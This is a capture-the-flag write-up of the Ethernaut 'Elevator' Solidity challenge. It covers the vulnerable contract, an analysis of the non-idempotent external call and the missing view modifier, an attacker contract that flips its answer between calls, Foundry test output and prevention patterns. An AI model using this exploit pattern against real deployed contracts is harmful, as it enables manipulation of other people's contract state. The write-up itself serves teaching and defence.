# 11 - Elevator

## 1. Challenge Overview

- **Objective**: Trick the `Elevator` contract into setting `top = true`.
- **Vulnerability Category**: Untrusted External Contract / Missing `view` Modifier (`STATICCALL`) / Non-Idempotent External Call.

---

## 2. Contract Source Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

---

## 3. Vulnerability Analysis

### The Flaw: Trusting `msg.sender` & Non-Idempotent Calls

Look at how `goTo(uint256 _floor)` validates whether `_floor` is the top floor:

```solidity
Building building = Building(msg.sender);

if (!building.isLastFloor(_floor)) {       // Call #1
    floor = _floor;
    top = building.isLastFloor(floor);     // Call #2
}
```

1. **Untrusted `Building(msg.sender)` Cast**:
   The contract assumes `msg.sender` is an honest `Building` contract that tells the truth about floor numbers. In reality, anyone can deploy a contract implementing `Building` and call `elevator.goTo(...)`.
2. **Missing `view` / `pure` Modifier**:
   In the `Building` interface, `isLastFloor(uint256)` is declared **without** `view` or `pure`:

   ```solidity
   function isLastFloor(uint256) external returns (bool);
   ```

   Because it is not restricted to a read-only `STATICCALL`, `isLastFloor` is permitted to **mutate storage** when called.

3. **Double External Call Assumption**:
   `Elevator` calls `building.isLastFloor` twice with the same floor value, assuming it is idempotent (will return the same result both times):
   - **Call #1**: Needs `isLastFloor` to return `false` so `!false == true` and execution enters the `if` block.
   - **Call #2**: Assigns `top = building.isLastFloor(floor)`, so returning `true` here sets `top = true`.

---

## 4. Exploit Architecture

### 1. Attacker Contract (`src/attackers/ElevatorAttack.sol`)

Our attacker implements `IBuilding`, calls `target.goTo(1)`, and tracks call count in storage:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IElevator, IBuilding} from "../interfaces/IElevator.sol";

contract ElevatorAttack is IBuilding {
    IElevator public target;
    uint256 public count = 0;

    constructor(address _targetAddress) {
        target = IElevator(_targetAddress);
    }

    function attack() external {
        target.goTo(1);
    }

    function isLastFloor(uint256) external override returns (bool) {
        count = count + 1;

        if (count == 1) {
            return false;
        } else {
            return true;
        }
    }
}
```

Notice in the EVM trace why Call #1 costs ~22,502 gas (`SSTORE` from `0 -> 1`), while Call #2 only costs ~604 gas (warm storage update `1 -> 2` returning `true`).

### 2. Proof-of-Concept Test (`test/11-Elevator.t.sol`)

```bash
forge test --match-contract ElevatorTest -vvvv
```

```text
Ran 2 tests for test/11-Elevator.t.sol:ElevatorTest
[PASS] test_InitialElevatorState() (gas: 10524)
[PASS] test_ReachTopFloorExploit() (gas: 93562)
Logs:
  Local PoC Success: Elevator top is true at floor 1
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 7.37ms (992.09µs CPU time)
```

### 3. Execution Script (`script/11-Elevator.s.sol`)

1. Reads `target.top()` and `target.floor()` from `INSTANCE_ADDRESS`.
2. Exits early if `target.top()` is already `true`.
3. Deploys `ElevatorAttack(instance)` and invokes `attackerContract.attack()`.
4. Verifies `require(target.top(), "Exploit failed: top is still false")`.

---

## 5. Prevention & Secure Patterns

1. **Enforce `view` on Read-Only Interfaces (`STATICCALL`)**:

   ```solidity
   interface Building {
       function isLastFloor(uint256) external view returns (bool);
   }
   ```

   From Solidity 0.5.0+, calls to `view` or `pure` interface functions compile down to the `STATICCALL` opcode. If `isLastFloor` attempts any state modification (`SSTORE`), the EVM immediately reverts.

2. **Cache External Return Values**:
   Never query the same external getter twice expecting consistency—save the result in a local variable and reuse it instead of making redundant external calls:

   ```solidity
   bool lastFloor = building.isLastFloor(_floor);
   if (!lastFloor) {
       floor = _floor;
       top = lastFloor;
   }
   ```

3. **Never Trust `msg.sender` as an Oracle**:
   An arbitrary caller (`msg.sender`) should not serve as the source of truth for invariants. Even with `view`, a `view` function can still read mutable state controlled by another address or depend on `gasleft()` (`view` only prevents _writing_ state inside that sub-call, not returning different results based on gas remaining!). Therefore, caching the single external call or managing floor limits internally inside `Elevator` is essential.
